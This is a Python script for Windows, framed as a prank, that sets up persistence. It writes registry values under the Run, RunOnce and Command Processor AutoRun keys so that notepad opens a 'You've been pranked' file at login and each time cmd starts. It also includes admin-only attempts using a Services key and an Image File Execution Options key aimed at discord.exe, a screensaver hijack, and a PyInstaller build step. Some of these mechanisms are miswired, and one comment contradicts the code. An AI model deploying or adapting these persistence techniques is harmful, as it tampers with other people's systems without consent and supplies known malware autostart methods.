import winreg as reg
import os
import shutil
from pathlib import Path

DOCUMENTS_PATH = os.path.join(os.path.expanduser("~"), "Documents")
TEXT_FILE_PATH = os.path.join(DOCUMENTS_PATH, "prank.txt")
EXECUTABLE_PY_PATH = os.path.join(DOCUMENTS_PATH, "quick_cmd.py")
EXECUTABLE_PATH = os.path.join(DOCUMENTS_PATH, "quick_cmd.exe")
RUN_PATH = r"notepad.exe " + TEXT_FILE_PATH
VALUE_NAME = "GetPranked"

def create_file(): # Creates the file if it doesn't already exist
    with open(TEXT_FILE_PATH, "w") as file:
        file.write("You've been pranked")
    # print(file_path)

def create_quick_cmd():
    launcher_code = """
import os
os.system('start cmd /c exit')
""" # Code within the created file
    with open(EXECUTABLE_PY_PATH, "w") as file:
        file.write(launcher_code)
    os.system(f"python -m PyInstaller --onefile \"{EXECUTABLE_PY_PATH}\"") # Turns the created Python file into an executable
    # Moves the file to the documents folder
    dist_executable = Path("dist") / "quick_cmd.exe"
    destination = os.path.join(DOCUMENTS_PATH, "quick_cmd.exe")
    if dist_executable.exists():
        shutil.move(str(dist_executable), str(destination))
    else:
        pass
    # Remove created folders and files to keep things clean
    for folder in ["dist", "build"]:
        if Path(folder).exists():
            shutil.rmtree(folder)
    spec_file = Path("quick_cmd.spec")
    if spec_file.exists():
        spec_file.unlink()


def add_to_startup(): # Add AutoRuns on system reboot
    hkcu_keys = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]
    for key in hkcu_keys:
        try:
            with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
                reg.SetValueEx(reg_key, VALUE_NAME, 0, reg.REG_SZ, RUN_PATH)
        except PermissionError:
            print("failed", key)


def add_to_cmd_start(): # Add AutoRun on command prompt launch
    try:
        key = r"Software\Microsoft\Command Processor"
        try:
            reg.OpenKey(reg.HKEY_CURRENT_USER, key)
        except FileNotFoundError:
            reg.CreateKey(reg.HKEY_CURRENT_USER, key)
        with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
            reg.SetValueEx(reg_key, r"AutoRun", 0, reg.REG_SZ, RUN_PATH)
    except PermissionError:
        print("failed", key)


def add_to_boot_verification(): # Runs on boot (uses old boot verification program)
    try:
        key = r"SYSTEM\CurrentControlSet\Services"
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_SET_VALUE) as reg_key:
            reg.SetValueEx(reg_key, VALUE_NAME, 0, reg.REG_SZ, RUN_PATH)
    except PermissionError:
        print("failed", key)
        # pass


def add_to_file_execution(): # Runs when other files are run
    try:
        key = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key, 0, reg.KEY_WRITE) as reg_key:
            target_key_path = os.path.join(key, r"discord.exe")
            target_key = reg.CreateKey(reg_key, target_key_path)
            reg.SetValueEx(target_key, VALUE_NAME, 0, reg.REG_SZ, RUN_PATH)
    except PermissionError:
        print("failed", key)


def add_to_screensaver(): # Attempt to set a file to run when the screensaver activates -- didn't work
    with reg.OpenKey(reg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, reg.KEY_SET_VALUE) as key:
        reg.SetValueEx(key, "SCRNSAVE.EXE", 0, reg.REG_SZ, RUN_PATH) # Set SCRNSAVE.EXE to another executable
        reg.SetValueEx(key, "ScreenSaveActive", 0, reg.REG_SZ, "1") # Activate screensaver (1 = active)
        reg.SetValueEx(key, "ScreenSaveTimeOut", 0, reg.REG_SZ, "15")  # Set activation timeout to 60 seconds


if __name__ == "__main__":
    # Fully working
    create_file()
    add_to_startup()
    add_to_cmd_start()
    # Only work with admin
    '''
    add_to_boot_verification()
    add_to_file_execution
    '''
    # Don't work
    '''
    add_to_screensaver()
    '''